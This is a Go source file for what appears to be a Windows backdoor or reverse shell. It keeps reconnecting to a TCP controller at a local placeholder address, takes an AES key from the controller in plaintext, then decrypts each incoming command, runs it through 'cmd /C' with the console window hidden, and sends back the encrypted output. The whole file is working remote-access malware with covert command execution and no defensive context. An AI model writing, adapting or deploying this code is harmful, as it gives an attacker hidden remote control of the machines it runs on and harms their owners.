package main

import "net"
import "fmt"
import "bufio"
import "os/exec"
import "syscall"
import "encoding/base64"
import "os"
import "time"
import "strings"
import "crypto/aes"
import "crypto/cipher"
import "crypto/rand"
import "io"

var EncKey string = ""

func main() {
	for {
		conn, err := net.Dial("tcp", "127.0.0.1:8181")
		if err != nil {
			time.Sleep(5 * time.Second)
		} else {
			for {
				message, _ := bufio.NewReader(conn).ReadString('\n')
				if len(message) >= 1 {
					if strings.Contains(string(message), "KEY:") {
						key := strings.Split(string(message), "KEY:")
						EncKey = key[1]
					} else {
						Command := decrypt([]byte(EncKey), string(message))
						if Command == "exit" {
							os.Exit(0)
						} else {
							cmd := exec.Command("cmd", "/C", Command)
							cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
							out, err := cmd.Output()
							if err != nil {
								fmt.Fprintf(conn, encrypt([]byte(EncKey), string("Error running command."))+"\n")
							} else {
								for len(out) >= 1 {
									fmt.Fprintf(conn, encrypt([]byte(EncKey), string(out))+"\n")
									break
								}
							}
						}
					}
				}
			}
		}
	}
}

func encrypt(key []byte, text string) string {
	plaintext := []byte(text)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	return base64.URLEncoding.EncodeToString(ciphertext)
}

func decrypt(key []byte, cryptoText string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(cryptoText)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	if len(ciphertext) < aes.BlockSize {
		panic("Ciphertext too short")
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	stream.XORKeyStream(ciphertext, ciphertext)

	return fmt.Sprintf("%s", ciphertext)
}
